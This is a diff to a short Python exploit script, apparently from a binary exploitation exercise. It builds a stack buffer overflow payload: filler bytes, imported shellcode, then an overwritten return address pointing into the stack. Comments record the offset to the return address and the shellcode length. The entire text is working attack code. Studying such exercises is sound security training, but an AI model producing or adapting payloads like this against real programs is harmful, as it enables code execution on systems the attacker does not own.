@@ -3,10 +3,10 @@
 import sys
 
 from shellcode import shellcode
-#sys.stdout.buffer.write(shellcode)
-sys.stdout.buffer.write(b'A'*16+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
+#sys.stdout.buffer.write(b'L'*8) 112 for input to return addr
 
-#sys.stdout.buffer.write(b'A'*50+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
+# 16 bytes in stack before input, 112 to return addr, 54 is shellcode, 58 remaining
+sys.stdout.buffer.write((0x70-54)*b'A'+shellcode+(8*b'A')+(2+0x7ffffff6d4e8).to_bytes(8,"little"))
 
 # ret: 0x0000000000401e0f
 
